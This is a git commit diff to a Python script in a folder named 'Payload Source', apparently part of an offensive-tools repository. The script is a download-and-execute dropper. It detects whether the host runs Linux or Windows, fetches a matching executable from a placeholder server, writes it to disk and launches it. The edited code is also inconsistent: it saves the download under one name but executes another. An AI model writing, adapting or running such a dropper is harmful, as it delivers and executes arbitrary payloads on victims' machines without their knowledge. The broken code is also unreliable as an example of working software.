c28dc44cdf15e5d5b8bc76a56e2b92701d902dff
rf-peixoto <50427765+rf-peixoto@users.noreply.github.com>
2021-06-03 13:48:52 -0300

    Update trail-blazer.py

--- Payload Source/trail-blazer.py
+++ Payload Source/trail-blazer.py
@@ -1,7 +1,14 @@
 import subprocess
+import platform
 import requests
 
-data = requests.get("http://your-server.com/payload_path/file")
+platform_os = platform.system()
+if platform_os == "Linux":
+    filename = "Linux Executable Name"
+elif platform_os == "Windows":
+    filename = "Windows Exe Name"
+
+data = requests.get("http://your-server.com/payload_path/{0}/{1}".format(platform_os, filename))
 with open("the_graverobber", "wb") as fl:
     fl.write(data.content)
-subprocess.Popen(args="", executable="the_graverobber")
+subprocess.Popen(args="", executable=filename)
